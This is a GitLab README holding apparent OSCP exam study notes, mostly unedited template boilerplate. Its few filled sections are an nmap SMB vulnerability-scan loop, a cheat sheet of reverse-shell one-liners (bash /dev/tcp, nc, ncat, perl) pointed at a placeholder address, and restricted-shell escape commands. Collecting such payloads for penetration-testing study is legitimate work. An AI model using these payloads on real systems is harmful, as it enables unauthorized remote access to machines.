# Crushing OSCP Notes

`Christian Galvan | March 17th, 2022

This will be to store my notes and link references used through taking my OSCP

## Getting started

To make it easy for you to get started with GitLab, here's a list of recommended next steps.

Already a pro? Just edit this README.md and make it your own. Want to make it easy? [Use the template at the bottom](#editing-this-readme)!

## Add your files

- [ ] [Create](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#create-a-file) or [upload](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#upload-a-file) files
- [ ] [Add files using the command line](https://docs.gitlab.com/ee/gitlab-basics/add-file.html#add-a-file-using-the-command-line) or push an existing Git repository with the following command:

```
cd existing_repo
git remote add origin https://gitlab.com/GalvanHacking/oscp.git
git branch -M main
git push -uf origin main
```

## Reference Links
### Web Recon
```
```
### Network Recon
```
```
### Look for LHF CVE's
```
nmap -A -p 139,445 10.11.1.1-254 -oG smb_results.txt

cat smb_results.txt | grep -i windows | cut -d" " -f2

 cat smb_results.txt | grep -i open | cut -d" " -f2 > smb_server_all.txt

for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done

```
### Searching Unauthenticated Access
```
```
### Web Enumeration
```
```
### Network Enumeration
```
```
### Gaining Access/Exploitation
```
```
### Creating Reverse Shells
https://www.revshells.com/
```
sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
sh -i >& /dev/udp/10.10.10.10/9001 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
nc -e sh 10.10.10.10 9001
nc.exe -e sh 10.10.10.10 9001
nc -c sh 10.10.10.10 9001
ncat 10.10.10.10 9001 -e sh
ncat.exe 10.10.10.10 9001 -e sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.10.10 9001 >/tmp/f
rcat 10.10.10.10 9001 -r sh
perl -e 'use Socket;$i="10.10.10.10";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

```
### Escaping Restricted Shells

https://www.metahackers.pro/breakout-of-restricted-shell/

https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--SSH--rbash_shell_esacping.html
```
BASH_CMDS[a]=/bin/sh;a
2
export PATH=$PATH:/bin/
3
export PATH=$PATH:/usr/bin
```
### Post-Exploitation/Situational Awareness
```
```
### Windows PrivEsc
```
```
### Linux PrivEsc
```
```
### Clean Up
```
```

## Integrate with your tools

- [ ] [Set up project integrations](https://gitlab.com/GalvanHacking/oscp/-/settings/integrations)

## Collaborate with your team

- [ ] [Invite team members and collaborators](https://docs.gitlab.com/ee/user/project/members/)
- [ ] [Create a new merge request](https://docs.gitlab.com/ee/user/project/merge_requests/creating_merge_requests.html)
- [ ] [Automatically close issues from merge requests](https://docs.gitlab.com/ee/user/project/issues/managing_issues.html#closing-issues-automatically)
- [ ] [Enable merge request approvals](https://docs.gitlab.com/ee/user/project/merge_requests/approvals/)
- [ ] [Automatically merge when pipeline succeeds](https://docs.gitlab.com/ee/user/project/merge_requests/merge_when_pipeline_succeeds.html)

## Test and Deploy

Use the built-in continuous integration in GitLab.

- [ ] [Get started with GitLab CI/CD](https://docs.gitlab.com/ee/ci/quick_start/index.html)
- [ ] [Analyze your code for known vulnerabilities with Static Application Security Testing(SAST)](https://docs.gitlab.com/ee/user/application_security/sast/)
- [ ] [Deploy to Kubernetes, Amazon EC2, or Amazon ECS using Auto Deploy](https://docs.gitlab.com/ee/topics/autodevops/requirements.html)
- [ ] [Use pull-based deployments for improved Kubernetes management](https://docs.gitlab.com/ee/user/clusters/agent/)
- [ ] [Set up protected environments](https://docs.gitlab.com/ee/ci/environments/protected_environments.html)

***

# Editing this README

When you're ready to make this README your own, just edit this file and use the handy template below (or feel free to structure it however you want - this is just a starting point!).  Thank you to [makeareadme.com](https://www.makeareadme.com/) for this template.

## Suggestions for a good README
Every project is different, so consider which of these sections apply to yours. The sections used in the template are suggestions for most open source projects. Also keep in mind that while a README can be too long and detailed, too long is better than too short. If you think your README is too long, consider utilizing another form of documentation rather than cutting out information.

## Name
Choose a self-explaining name for your project.

## Description
Let people know what your project can do specifically. Provide context and add a link to any reference visitors might be unfamiliar with. A list of Features or a Background subsection can also be added here. If there are alternatives to your project, this is a good place to list differentiating factors.

## Badges
On some READMEs, you may see small images that convey metadata, such as whether or not all the tests are passing for the project. You can use Shields to add some to your README. Many services also have instructions for adding a badge.

## Visuals
Depending on what you are making, it can be a good idea to include screenshots or even a video (you'll frequently see GIFs rather than actual videos). Tools like ttygif can help, but check out Asciinema for a more sophisticated method.

## Installation
Within a particular ecosystem, there may be a common way of installing things, such as using Yarn, NuGet, or Homebrew. However, consider the possibility that whoever is reading your README is a novice and would like more guidance. Listing specific steps helps remove ambiguity and gets people to using your project as quickly as possible. If it only runs in a specific context like a particular programming language version or operating system or has dependencies that have to be installed manually, also add a Requirements subsection.

## Usage
Use examples liberally, and show the expected output if you can. It's helpful to have inline the smallest example of usage that you can demonstrate, while providing links to more sophisticated examples if they are too long to reasonably include in the README.

## Support
Tell people where they can go to for help. It can be any combination of an issue tracker, a chat room, an email address, etc.

## Roadmap
If you have ideas for releases in the future, it is a good idea to list them in the README.

## Contributing
State if you are open to contributions and what your requirements are for accepting them.

For people who want to make changes to your project, it's helpful to have some documentation on how to get started. Perhaps there is a script that they should run or some environment variables that they need to set. Make these steps explicit. These instructions could also be useful to your future self.

You can also document commands to lint the code or run tests. These steps help to ensure high code quality and reduce the likelihood that the changes inadvertently break something. Having instructions for running tests is especially helpful if it requires external setup, such as starting a Selenium server for testing in a browser.

## Authors and acknowledgment
Show your appreciation to those who have contributed to the project.

## License
For open source projects, say how it is licensed.

## Project status
If you have run out of energy or time for your project, put a note at the top of the README saying that development has slowed down or stopped completely. Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers.
